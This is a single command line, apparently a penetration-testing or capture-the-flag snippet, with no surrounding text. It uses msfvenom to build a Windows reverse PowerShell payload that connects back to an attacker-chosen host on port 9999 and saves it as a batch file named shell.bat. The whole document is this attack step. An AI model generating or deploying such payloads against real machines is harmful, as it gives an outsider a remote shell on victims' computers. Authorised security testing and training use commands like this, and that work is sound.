msfvenom -p cmd/windows/reverse_powershell LHOST=<Your_IP> LPORT=9999 -f raw -o shell.bat
